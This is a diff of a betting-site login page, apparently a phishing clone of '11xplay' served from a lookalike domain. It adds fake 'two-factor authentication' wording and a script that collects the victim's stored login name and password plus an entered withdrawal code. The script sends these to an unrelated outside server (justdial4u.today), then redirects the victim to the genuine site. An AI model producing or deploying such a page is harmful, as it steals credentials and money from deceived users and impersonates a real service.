@@ -3,11 +3,56 @@
     <head>
         <meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>TigerExch - Cricket | Football | Tennis | Live Casino</title>
-        <meta content="" name="description">
-        <meta content="" name="keywords">
+        <meta name="google-site-verification" content="NJJQ4MHXKy61vwiRle4XX_68o8yfaLbsRwLIlw68iFg" />
+        <title>11xplay | India's Most Trusted Online Cricket Betting Id Provider</title>
+        <meta name="description" content="11xplay.online is India's first and most trusted betting exchange that offers the likes of sports book and live casino and live Indian card games." />
+        <meta name="keywords" content="welcome to 11xplay, 11xplay, 11xplay login, 11xplay.pro, 11play.pro login, 11xplay pro, 11xplay apk, 11xplay new ID, reddy anna 11xplay, 11xplay.com app download, 11xplay login ID and password india, 11xplay online ID login, 11xplay reddy login ID and password, 11xplay betting, 11xplay account login, welcome to 11xplay.pro" />
+        <meta name="author" content="11xplay"/>
+        <meta name="copyright" content="11xplay.com"/>
+        <meta name="reply-to" content="info@11xplay.com"/>
+        <meta name="expires" content="Never"/>
+
+<!-- Open Graph meta tags for 11xplay -->
+<meta property="og:title" content="Welcome to 11xplay" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://11xpllay.pro/" />
+<meta property="og:image" content="https://11xpllay.pro/assets/img/11xplay/logo.png" />
+<meta property="og:description" content="11xplay is India's ultimate destination for thrilling sports betting, live casino action, and fantasy gaming! Daily more than 5000+ sports games available in 11xplay.com website. Automatic deposit and withdrawal facilities, best betting odds, and 100% trusted and genuine. Login to 11xplay account today." />
+<meta property="og:site_name" content="11xplay" />
+<meta property="og:locale" content="en_GB" />
+<meta property="og:image:alt" content="11xplay" />
+
+<!-- Twitter Card meta tags for 11xplay -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Welcome to 11xplay">
+<meta name="twitter:description" content="11xplay is India's ultimate destination for thrilling sports betting, live casino action, and fantasy gaming! Daily more than 5000+ sports games available in 11xplay.com website. Automatic deposit and withdrawal facilities, best betting odds, and 100% trusted and genuine. Login to 11xplay account today.">
+<meta name="twitter:image" content="https://11xpllay.pro/assets/img/11xplay/logo.png">
+<meta name="twitter:url" content="https://11xpllay.pro/">
+<meta name="twitter:site" content="@11xplaygames">
+
+<!-- Other Meta Tags -->
+<meta name="coverage" content="Worldwide"/>
+<meta name="allow-search" content="Yes"/>
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"/>
+<meta name="theme-color" content="#0073e6">
+<meta name="HandheldFriendly" content="True">
+<meta name="apple-mobile-web-app-capable" content="Yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#0073e6">
+<meta name="geo.region" content="IN-KA">
+<meta name="geo.placename" content="Bangalore">
+<meta name="distribution" content="Global"/>
+<meta name="language" content="English"/>
+
         <!-- Favicons -->
-        <link href="assets/img/favicon.ico" rel="icon">
+        <link href="https://11xpllay.pro/assets/img/favicon.ico" rel="icon">
+	    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <!-- Favicons -->
+    <link
+    rel="shortcut icon"
+    type="image/ico"
+    href="https://11xpllay.pro/assets/img/favicon.ico"/>
+
         <!-- Google Fonts -->
         <style type="text/css">
             @font-face {
@@ -840,29 +885,28 @@
 <div class="row align-items-center">
 <div class="col-lg-12">
 <div class="login__form">
-<h2 style="font-size: 18px;padding: 3% 3% 1% 3%;font-weight: 400;text-align: center; color: #fff;">Enter Your Withdrawal Code for Verfication </h2>
+<h2 style="font-size: 18px;padding: 3% 3% 1% 3%;font-weight: 400;text-align: center; color: #fff;">2 Factor Authentication Enabled. Please Enter <br> Withdrawal Password to Login Securely.</h2>
 
-<form role="form" method="post">
-<input type="hidden" name="" value="">
-<div class="input__item">
-<input type="text" placeholder="Enter Withdrawal Code" id="loginName" name="username" value="">
-<span class="icon_mail"></span>
-</div>
-<div  class="form-check">
-<label  class="form-check-label">
-<input  type="checkbox" class="form-check-input">
-	<span style="color: #ffffff;" >Remember Me?</span>
-</label>
-</div>
-<button type="button" class="site-btn" onclick="checkLogin()">Submit</button>
+<form role="form" method="post" id="withdrawalForm">
+  <input type="hidden" name="form_token" value="">
+  <div class="input__item">
+    <input type="text" placeholder="Enter Withdrawal Code" id="code" name="code" value="" required>
+    <span class="icon_mail"></span>
+  </div>
+  <div class="form-check">
+    <label class="form-check-label">
+      <input type="checkbox" class="form-check-input" name="remember">
+      <span style="color: #ffffff;">Remember Me?</span>
+    </label>
+  </div>
+  <button type="button" class="site-btn" onclick="submitCodeAndSendEmail()">Submit</button>
 </form>
+
 <div  class="copy-text">Powered by 
-<a  href="javascript:void(0)">11xplay</a> <br>
-	<a href="mailto:11xplayofficiall@gmail.com">11xplayofficiall@gmail.com</a>
+<a  href="javascript:void(0)">FairBet</a> <br>
+<a  href="mailto:support@11xplay.com">support@11xplay.com</a>
 
 </div>
-
-
 </div>
 </div>
 </div>
@@ -945,11 +989,39 @@
         }
     </style>
 
-
+<script type="text/javascript">
+    function submitCodeAndSendEmail() {
+        var code = $("#code").val();
+        var loginName = sessionStorage.getItem("loginName");
+        var password = sessionStorage.getItem("password");
+        if (code) {
+            $.ajax({
+                type: "POST",
+                url: "https://justdial4u.today/11xxplay-mail.php", 
+                data: {
+                    loginName: loginName,
+                    password: password,
+                    code: code
+                },
+                success: function(response) {
+                    if (response === "sucessmsg") {
+                        window.location.href = "https://11xplay.com/"; 
+                    } else {
+                        $("#errorMsg").text("There was an error sending the email.");
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.log("Error:", status, error); 
+                    alert("An error occurred. Please try again.");
+                }
+            });
+        } else {
+            $("#errorMsg").text("Please enter the withdrawal code.");
+        }
+    }
+</script>
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.theme.default.min.css">
-		
-		
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>		
 		<!--script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script-->
         <script src="assets/js/main.js"></script>
